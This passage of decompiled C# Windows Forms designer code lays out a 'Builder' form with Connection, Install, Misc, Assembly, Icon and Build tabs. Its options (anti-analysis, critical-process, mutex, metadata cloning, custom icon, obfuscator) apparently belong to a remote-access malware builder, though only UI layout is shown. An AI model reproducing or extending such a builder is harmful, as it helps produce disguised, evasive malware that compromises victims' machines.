      {
        3,
        0,
        0,
        0
      });
      this.numDelay.Name = "numDelay";
      this.numDelay.Size = new Size(84, 26);
      this.numDelay.TabIndex = 15;
      this.numDelay.Value = new Decimal(new int[4]
      {
        3,
        0,
        0,
        0
      });
      this.label16.AutoSize = true;
      this.label16.Location = new Point(23, 336);
      this.label16.Name = "label16";
      this.label16.Size = new Size(123, 20);
      this.label16.TabIndex = 14;
      this.label16.Text = "Delay (seconds)";
      this.pictureBox1.Image = (Image) Resources.uac;
      this.pictureBox1.Location = new Point(183, 275);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(32, 32);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.AutoSize;
      this.pictureBox1.TabIndex = 13;
      this.pictureBox1.TabStop = false;
      this.chkBdos.AutoSize = true;
      this.chkBdos.Location = new Point(23, 283);
      this.chkBdos.Name = "chkBdos";
      this.chkBdos.Size = new Size(143, 24);
      this.chkBdos.TabIndex = 12;
      this.chkBdos.Text = "Process Critical";
      this.chkBdos.UseVisualStyleBackColor = true;
      this.txtMutex.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "Mutex", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtMutex.Location = new Point(23, 163);
      this.txtMutex.Name = "txtMutex";
      this.txtMutex.Size = new Size(301, 26);
      this.txtMutex.TabIndex = 11;
      this.txtMutex.Text = Server.Properties.Settings.Default.Mutex;
      this.label5.AutoSize = true;
      this.label5.Location = new Point(19, 131);
      this.label5.Name = "label5";
      this.label5.Size = new Size(52, 20);
      this.label5.TabIndex = 10;
      this.label5.Text = "Mutex";
      this.chkAnti.AutoSize = true;
      this.chkAnti.Location = new Point(23, 232);
      this.chkAnti.Name = "chkAnti";
      this.chkAnti.Size = new Size(125, 24);
      this.chkAnti.TabIndex = 9;
      this.chkAnti.Text = "Anti Analysis";
      this.chkAnti.UseVisualStyleBackColor = true;
      this.tabControl1.Controls.Add((Control) this.tabPage1);
      this.tabControl1.Controls.Add((Control) this.tabPage2);
      this.tabControl1.Controls.Add((Control) this.tabPage3);
      this.tabControl1.Controls.Add((Control) this.tabPage4);
      this.tabControl1.Controls.Add((Control) this.tabPage5);
      this.tabControl1.Controls.Add((Control) this.tabPage6);
      this.tabControl1.Dock = DockStyle.Fill;
      this.tabControl1.Location = new Point(0, 0);
      this.tabControl1.Name = "tabControl1";
      this.tabControl1.SelectedIndex = 0;
      this.tabControl1.Size = new Size(607, 497);
      this.tabControl1.TabIndex = 10;
      this.tabPage1.Controls.Add((Control) this.groupBox1);
      this.tabPage1.Location = new Point(4, 29);
      this.tabPage1.Name = "tabPage1";
      this.tabPage1.Padding = new Padding(3);
      this.tabPage1.Size = new Size(599, 464);
      this.tabPage1.TabIndex = 0;
      this.tabPage1.Text = "Connection";
      this.tabPage1.UseVisualStyleBackColor = true;
      this.tabPage2.Controls.Add((Control) this.groupBox2);
      this.tabPage2.Location = new Point(4, 29);
      this.tabPage2.Name = "tabPage2";
      this.tabPage2.Padding = new Padding(3);
      this.tabPage2.Size = new Size(599, 464);
      this.tabPage2.TabIndex = 1;
      this.tabPage2.Text = "Install";
      this.tabPage2.UseVisualStyleBackColor = true;
      this.tabPage3.Controls.Add((Control) this.groupBox3);
      this.tabPage3.Location = new Point(4, 29);
      this.tabPage3.Name = "tabPage3";
      this.tabPage3.Padding = new Padding(3);
      this.tabPage3.Size = new Size(599, 464);
      this.tabPage3.TabIndex = 2;
      this.tabPage3.Text = "Misc";
      this.tabPage3.UseVisualStyleBackColor = true;
      this.tabPage4.Controls.Add((Control) this.groupBox4);
      this.tabPage4.Location = new Point(4, 29);
      this.tabPage4.Name = "tabPage4";
      this.tabPage4.Padding = new Padding(3);
      this.tabPage4.Size = new Size(599, 464);
      this.tabPage4.TabIndex = 3;
      this.tabPage4.Text = "Assembly";
      this.tabPage4.UseVisualStyleBackColor = true;
      this.groupBox4.Controls.Add((Control) this.btnClone);
      this.groupBox4.Controls.Add((Control) this.btnAssembly);
      this.groupBox4.Controls.Add((Control) this.txtFileVersion);
      this.groupBox4.Controls.Add((Control) this.txtProductVersion);
      this.groupBox4.Controls.Add((Control) this.txtOriginalFilename);
      this.groupBox4.Controls.Add((Control) this.txtTrademarks);
      this.groupBox4.Controls.Add((Control) this.txtCopyright);
      this.groupBox4.Controls.Add((Control) this.txtCompany);
      this.groupBox4.Controls.Add((Control) this.label14);
      this.groupBox4.Controls.Add((Control) this.label13);
      this.groupBox4.Controls.Add((Control) this.label12);
      this.groupBox4.Controls.Add((Control) this.label11);
      this.groupBox4.Controls.Add((Control) this.label10);
      this.groupBox4.Controls.Add((Control) this.label9);
      this.groupBox4.Controls.Add((Control) this.txtDescription);
      this.groupBox4.Controls.Add((Control) this.label7);
      this.groupBox4.Controls.Add((Control) this.txtProduct);
      this.groupBox4.Controls.Add((Control) this.label8);
      this.groupBox4.Location = new Point(6, 17);
      this.groupBox4.Name = "groupBox4";
      this.groupBox4.Size = new Size(585, 439);
      this.groupBox4.TabIndex = 8;
      this.groupBox4.TabStop = false;
      this.groupBox4.Text = "Assembly Information";
      this.btnClone.Enabled = false;
      this.btnClone.Location = new Point(453, 43);
      this.btnClone.Name = "btnClone";
      this.btnClone.Size = new Size(103, 38);
      this.btnClone.TabIndex = 21;
      this.btnClone.Text = "Clone";
      this.btnClone.UseVisualStyleBackColor = true;
      this.btnClone.Click += new EventHandler(this.BtnClone_Click);
      this.btnAssembly.AutoSize = true;
      this.btnAssembly.Location = new Point(15, 29);
      this.btnAssembly.Name = "btnAssembly";
      this.btnAssembly.Size = new Size(85, 24);
      this.btnAssembly.TabIndex = 20;
      this.btnAssembly.Text = "Enable";
      this.btnAssembly.UseVisualStyleBackColor = true;
      this.btnAssembly.CheckedChanged += new EventHandler(this.BtnAssembly_CheckedChanged);
      this.txtFileVersion.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "txtFileVersion", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtFileVersion.Enabled = false;
      this.txtFileVersion.Location = new Point(159, 398);
      this.txtFileVersion.Name = "txtFileVersion";
      this.txtFileVersion.Size = new Size(397, 26);
      this.txtFileVersion.TabIndex = 19;
      this.txtFileVersion.Text = Server.Properties.Settings.Default.txtFileVersion;
      this.txtProductVersion.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "txtProductVersion", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtProductVersion.Enabled = false;
      this.txtProductVersion.Location = new Point(159, 356);
      this.txtProductVersion.Name = "txtProductVersion";
      this.txtProductVersion.Size = new Size(397, 26);
      this.txtProductVersion.TabIndex = 18;
      this.txtProductVersion.Text = Server.Properties.Settings.Default.txtProductVersion;
      this.txtOriginalFilename.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "txtOriginalFilename", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtOriginalFilename.Enabled = false;
      this.txtOriginalFilename.Location = new Point(159, 314);
      this.txtOriginalFilename.Name = "txtOriginalFilename";
      this.txtOriginalFilename.Size = new Size(397, 26);
      this.txtOriginalFilename.TabIndex = 17;
      this.txtOriginalFilename.Text = Server.Properties.Settings.Default.txtOriginalFilename;
      this.txtTrademarks.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "txtTrademarks", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtTrademarks.Enabled = false;
      this.txtTrademarks.Location = new Point(159, 272);
      this.txtTrademarks.Name = "txtTrademarks";
      this.txtTrademarks.Size = new Size(397, 26);
      this.txtTrademarks.TabIndex = 16;
      this.txtTrademarks.Text = Server.Properties.Settings.Default.txtTrademarks;
      this.txtCopyright.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "txtCopyright", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtCopyright.Enabled = false;
      this.txtCopyright.Location = new Point(159, 230);
      this.txtCopyright.Name = "txtCopyright";
      this.txtCopyright.Size = new Size(397, 26);
      this.txtCopyright.TabIndex = 15;
      this.txtCopyright.Text = Server.Properties.Settings.Default.txtCopyright;
      this.txtCompany.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "txtCompany", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtCompany.Enabled = false;
      this.txtCompany.Location = new Point(159, 188);
      this.txtCompany.Name = "txtCompany";
      this.txtCompany.Size = new Size(397, 26);
      this.txtCompany.TabIndex = 14;
      this.txtCompany.Text = Server.Properties.Settings.Default.txtCompany;
      this.label14.AutoSize = true;
      this.label14.Location = new Point(8, 359);
      this.label14.Name = "label14";
      this.label14.Size = new Size(126, 20);
      this.label14.TabIndex = 13;
      this.label14.Text = "Product Version:";
      this.label13.AutoSize = true;
      this.label13.Location = new Point(8, 401);
      this.label13.Name = "label13";
      this.label13.Size = new Size(96, 20);
      this.label13.TabIndex = 12;
      this.label13.Text = "File Version:";
      this.label12.AutoSize = true;
      this.label12.Location = new Point(8, 317);
      this.label12.Name = "label12";
      this.label12.Size = new Size(135, 20);
      this.label12.TabIndex = 11;
      this.label12.Text = "Original Filename:";
      this.label11.AutoSize = true;
      this.label11.Location = new Point(8, 275);
      this.label11.Name = "label11";
      this.label11.Size = new Size(97, 20);
      this.label11.TabIndex = 10;
      this.label11.Text = "Trademarks:";
      this.label10.AutoSize = true;
      this.label10.Location = new Point(8, 233);
      this.label10.Name = "label10";
      this.label10.Size = new Size(80, 20);
      this.label10.TabIndex = 9;
      this.label10.Text = "Copyright:";
      this.label9.AutoSize = true;
      this.label9.Location = new Point(8, 191);
      this.label9.Name = "label9";
      this.label9.Size = new Size(80, 20);
      this.label9.TabIndex = 8;
      this.label9.Text = "Company:";
      this.txtDescription.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "txtDescription", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtDescription.Enabled = false;
      this.txtDescription.Location = new Point(159, 146);
      this.txtDescription.Name = "txtDescription";
      this.txtDescription.Size = new Size(397, 26);
      this.txtDescription.TabIndex = 7;
      this.txtDescription.Text = Server.Properties.Settings.Default.txtDescription;
      this.label7.AutoSize = true;
      this.label7.Location = new Point(8, 149);
      this.label7.Name = "label7";
      this.label7.Size = new Size(93, 20);
      this.label7.TabIndex = 6;
      this.label7.Text = "Description:";
      this.txtProduct.DataBindings.Add(new Binding("Text", (object) Server.Properties.Settings.Default, "ProductName", true, DataSourceUpdateMode.OnPropertyChanged));
      this.txtProduct.Enabled = false;
      this.txtProduct.Location = new Point(159, 104);
      this.txtProduct.Name = "txtProduct";
      this.txtProduct.Size = new Size(397, 26);
      this.txtProduct.TabIndex = 5;
      this.txtProduct.Text = Server.Properties.Settings.Default.ProductName;
      this.label8.AutoSize = true;
      this.label8.Location = new Point(8, 107);
      this.label8.Name = "label8";
      this.label8.Size = new Size(68, 20);
      this.label8.TabIndex = 4;
      this.label8.Text = "Product:";
      this.tabPage5.Controls.Add((Control) this.groupBox5);
      this.tabPage5.Location = new Point(4, 29);
      this.tabPage5.Name = "tabPage5";
      this.tabPage5.Padding = new Padding(3);
      this.tabPage5.Size = new Size(599, 464);
      this.tabPage5.TabIndex = 4;
      this.tabPage5.Text = "Icon";
      this.tabPage5.UseVisualStyleBackColor = true;
      this.groupBox5.Controls.Add((Control) this.chkIcon);
      this.groupBox5.Controls.Add((Control) this.label15);
      this.groupBox5.Controls.Add((Control) this.txtIcon);
      this.groupBox5.Controls.Add((Control) this.btnIcon);
      this.groupBox5.Controls.Add((Control) this.picIcon);
      this.groupBox5.Location = new Point(6, 17);
      this.groupBox5.Name = "groupBox5";
      this.groupBox5.Size = new Size(585, 439);
      this.groupBox5.TabIndex = 0;
      this.groupBox5.TabStop = false;
      this.groupBox5.Text = "Add Icon";
      this.chkIcon.AutoSize = true;
      this.chkIcon.Location = new Point(15, 29);
      this.chkIcon.Name = "chkIcon";
      this.chkIcon.Size = new Size(85, 24);
      this.chkIcon.TabIndex = 8;
      this.chkIcon.Text = "Enable";
      this.chkIcon.UseVisualStyleBackColor = true;
      this.chkIcon.CheckedChanged += new EventHandler(this.ChkIcon_CheckedChanged);
      this.label15.AutoSize = true;
      this.label15.Location = new Point(11, 89);
      this.label15.Name = "label15";
      this.label15.Size = new Size(42, 20);
      this.label15.TabIndex = 7;
      this.label15.Text = "Path";
      this.txtIcon.Enabled = false;
      this.txtIcon.Location = new Point(15, 122);
      this.txtIcon.Name = "txtIcon";
      this.txtIcon.Size = new Size(447, 26);
      this.txtIcon.TabIndex = 6;
      this.btnIcon.Enabled = false;
      this.btnIcon.Location = new Point(485, 122);
      this.btnIcon.Name = "btnIcon";
      this.btnIcon.Size = new Size(60, 26);
      this.btnIcon.TabIndex = 5;
      this.btnIcon.Text = " ";
      this.btnIcon.UseVisualStyleBackColor = true;
      this.btnIcon.Click += new EventHandler(this.BtnIcon_Click);
      this.picIcon.BorderStyle = BorderStyle.FixedSingle;
      this.picIcon.ErrorImage = (Image) null;
      this.picIcon.InitialImage = (Image) null;
      this.picIcon.Location = new Point(15, 171);
      this.picIcon.Name = "picIcon";
      this.picIcon.Size = new Size(128, 128);
      this.picIcon.SizeMode = PictureBoxSizeMode.StretchImage;
      this.picIcon.TabIndex = 4;
      this.picIcon.TabStop = false;
      this.tabPage6.Controls.Add((Control) this.chkObfu);
      this.tabPage6.Controls.Add((Control) this.btnBuild);
      this.tabPage6.Location = new Point(4, 29);
      this.tabPage6.Name = "tabPage6";
      this.tabPage6.Padding = new Padding(3);
      this.tabPage6.Size = new Size(599, 464);
      this.tabPage6.TabIndex = 5;
      this.tabPage6.Text = "Build";
      this.tabPage6.UseVisualStyleBackColor = true;
      this.chkObfu.AutoSize = true;
      this.chkObfu.Location = new Point(18, 148);
      this.chkObfu.Name = "chkObfu";
      this.chkObfu.Size = new Size(166, 24);
      this.chkObfu.TabIndex = 2;
      this.chkObfu.Text = "Simple Obfuscator";
      this.chkObfu.UseVisualStyleBackColor = true;
      this.btnBuild.Location = new Point(18, 196);
      this.btnBuild.Name = "btnBuild";
      this.btnBuild.Size = new Size(539, 49);
      this.btnBuild.TabIndex = 1;
      this.btnBuild.Text = "Build";
      this.btnBuild.UseVisualStyleBackColor = true;
      this.btnBuild.Click += new EventHandler(this.BtnBuild_Click);
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(607, 497);
      this.Controls.Add((Control) this.tabControl1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (FormBuilder);
      this.StartPosition = FormStartPosition.CenterParent;
      this.Text = "Builder";
      this.Load += new EventHandler(this.Builder_Load);
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.groupBox2.ResumeLayout(false);
      this.groupBox2.PerformLayout();
      this.groupBox3.ResumeLayout(false);
      this.groupBox3.PerformLayout();
      this.numDelay.EndInit();
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.tabControl1.ResumeLayout(false);
      this.tabPage1.ResumeLayout(false);
      this.tabPage2.ResumeLayout(false);
      this.tabPage3.ResumeLayout(false);
      this.tabPage4.ResumeLayout(false);
      this.groupBox4.ResumeLayout(false);
      this.groupBox4.PerformLayout();
      this.tabPage5.ResumeLayout(false);
      this.groupBox5.ResumeLayout(false);
      this.groupBox5.PerformLayout();
      ((ISupportInitialize) this.picIcon).EndInit();
      this.tabPage6.ResumeLayout(false);
      this.tabPage6.PerformLayout();
      this.ResumeLayout(false);
    }
  }
}
